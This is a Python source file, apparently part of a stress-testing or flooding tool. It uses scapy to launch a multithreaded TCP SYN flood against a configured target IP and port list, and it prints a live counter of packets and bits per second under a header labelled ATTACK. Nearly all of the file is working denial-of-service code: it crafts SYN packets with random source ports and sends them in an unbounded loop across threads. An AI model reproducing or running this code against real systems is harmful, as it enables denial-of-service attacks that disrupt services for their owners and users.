#!/usr/bin/env python
import threading
from scapy.layers.inet import IP, TCP, RandShort, ls, send
from scapy.sendrecv import srloop

import time

from CFGClass import *
from amplificationStav import Calc

ATTACK = (
    '     Sent      '
    '|    Traffic    '
    '|    Packet/s   '
    '|     Bit/s     '
    '\n{}').format('-' * 63)

npackets = 0
nbytes = 0

class PacketSenderManager:
    def __init__(self, configFileManager, transportType,event):
        self.configFileHelper = configFileManager
        self.transportType = transportType
        self.threads = configFileManager.synFlood.threads
        self.event = event

    def stress(self):
        if self.transportType =='TCP':
            for i in range(self.threads):
                t = threading.Thread(target=self.startTCPSender)
                t.start()

    def startTCPSender(self):
        global npackets
        global nbytes
        ports = (self.configFileHelper.synFlood.port)
        portList = ports.split(',')
        intPortList = map(int, portList)
        # print ports
        # print portList
        # print intPortList
        ip = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255)
        tcp = TCP(sport=RandShort(),dport=intPortList,seq=0, ack=0,window=64,flags="S")
        data = "SZR_TPRK"
        package = ip / tcp / data
        while self.event.isSet():
            send(package, verbose=False)
            npackets += 1
            nbytes = npackets*len(package)
            #print str(self.npackets) + ' ' + str(self.nbytes)

        # p = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
        #                                                                        dport=intPortList,
        #                                                                        seq=12345, ack=1000,
        #                                                                        window=1000,
        #                                                                        flags="S") / "SZR_TPRK"

        # ls(p)
        # if self.configFileHelper.synFlood.flooding == 'yes':
        #     print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2)
        #     # print "Summary of answered & unanswered packets"
        #     # ans.summary()
        #     # unans.summary()
        #     print "source port flags in response"
        #     # for s,r in ans:
        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
        #     ans.make_table(
        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
        # elif self.configFileHelper.synFlood.flooding == 'no':
        #     print 'Flooding mode disabled.'
        #     print str(self.fconfigFileHelper.synFlood.packetCount) + ' packets will be sent..'
        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2,
        #                         count=self.configFileHelper.synFlood.packetCount)
        #     # print "Summary of answered & unanswered packets"
        #     # ans.summary()
        #     # unans.summary()
        #     print "source port flags in response"
        #     # for s,r in ans:
        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
        #     ans.make_table(
        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
def monitorNetwork():
    print ATTACK
    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
    start = time.time()
    while True:
        try:
            current = time.time() - start
            bps = (nbytes * 8) / current
            pps = npackets / current
            out = FMT.format(Calc(npackets, 1000),
                              Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
            sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
            time.sleep(1)
        except KeyboardInterrupt:
            print '\nInterrupted'
            break
        except Exception as err:
            print '\nError:', str(err)
            break